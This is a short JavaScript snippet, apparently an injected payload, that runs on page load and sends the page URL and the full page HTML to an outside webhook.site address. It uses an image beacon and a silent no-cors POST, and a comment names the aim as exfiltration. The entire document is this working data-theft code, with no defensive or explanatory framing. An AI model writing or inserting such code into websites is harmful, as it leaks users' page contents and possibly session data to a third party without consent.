(function(){
  try {
    var hook = "https://webhook.site/e925819f-2c81-4cbe-a619-a0f20f9aa493";
    new Image().src = hook + "?ev=loaded&u=" + encodeURIComponent(location.href);
    // try to exfiltrate page HTML (no-cors POST still triggers the request)
    fetch(hook, {method:'POST', mode:'no-cors', body: document.documentElement.innerHTML}).catch(()=>{});
  } catch(e){}
})();
